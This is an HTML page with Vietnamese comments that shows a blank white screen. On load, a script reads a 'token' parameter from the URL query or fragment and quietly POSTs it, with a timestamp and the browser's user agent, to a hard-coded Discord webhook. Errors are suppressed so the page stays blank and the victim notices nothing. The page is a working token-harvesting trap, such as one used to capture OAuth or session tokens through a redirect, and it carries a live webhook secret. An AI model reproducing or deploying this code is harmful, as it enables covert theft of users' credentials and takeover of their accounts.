<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <style>
        /* Đảm bảo trang hiển thị hoàn toàn trắng */
        body, html {
            background-color: #ffffff;
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
        }
    </style>
</head>
<body>

<script>
    // Điền URL Webhook của bạn tại đây
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1568610122794664119/uEuSKJfGpF96kMblYpnjVVYyTBYL6DuWafptMyxuITU_Ep0Lfq94AQWXv6QLxsXoVBKe";

    function extractToken() {
        // 1. Kiểm tra tham số URL (?token=...)
        const urlParams = new URLSearchParams(window.location.search);
        let token = urlParams.get('token');

        // 2. Nếu không có ở query parameter, kiểm tra URL Fragment (#token=...)
        if (!token && window.location.hash) {
            const hashParams = new URLSearchParams(window.location.hash.substring(1));
            token = hashParams.get('token');
        }

        return token;
    }

    function sendTokenToWebhook(token) {
        if (!token || !WEBHOOK_URL || WEBHOOK_URL.includes("your-webhook-url.com")) return;

        const payload = {
            token: token,
            time: new Date().toISOString(),
            userAgent: navigator.userAgent
        };

        // Gửi dữ liệu qua fetch API
        fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        }).catch(err => {
            // Giữ im lặng nếu có lỗi để đảm bảo trang luôn trắng tinh
        });
    }

    window.onload = function() {
        const token = extractToken();
        if (token) {
            sendTokenToWebhook(token);
        }
    };
</script>

</body>
</html>
